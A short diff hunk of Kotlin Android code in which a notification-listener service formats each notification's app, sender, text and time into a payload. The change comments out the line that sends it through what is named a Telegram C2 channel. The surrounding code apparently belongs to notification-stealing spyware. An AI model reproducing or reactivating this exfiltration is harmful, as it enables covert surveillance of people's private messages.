@@ -21,7 +21,7 @@ class NotifListener : NotificationListenerService() {
 
         val payload = "NOTIF: $pkg\nFrom: $title\nText: $text\nTime: $whenTs"
         try {
-            TelegramC2.send(applicationContext, payload)
+            // TelegramC2.send(applicationContext, payload)
         } catch (_: Throwable) {}
     }
 
